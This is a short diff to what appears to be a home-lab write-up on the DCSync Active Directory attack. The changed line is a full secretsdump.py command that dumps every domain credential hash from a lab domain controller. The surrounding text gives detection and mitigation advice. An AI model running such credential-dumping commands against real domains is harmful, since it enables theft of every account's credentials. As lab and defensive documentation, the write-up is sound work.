@@ -17,7 +17,7 @@ DCSync is an Active Directory attack technique (MITRE ATT&CK T1003.006) where an
 
 ### 1. Impersonated a Domain Controller and replicated all credential data
 ```bash
-secretsdump.py lab.local/swetha:password@192.168.56.107 -just-dc
+secretsdump.py lab.local/swetha:password@192.168.56.10 -just-dc
 ```
 Result: Dumped all domain credential hashes, including Administrator, krbtgt, and svc-sql (hash values redacted)
 
@@ -56,7 +56,4 @@ The detection relies on filtering out legitimate DC machine accounts in a broade
 - Restrict replication rights to Domain Controllers and Domain Admins only
 - Monitor Event ID 4662 for replication requests from non-DC accounts
 - Rotate the krbtgt password (twice, per Microsoft guidance) if DCSync is suspected
-
-  
-
 
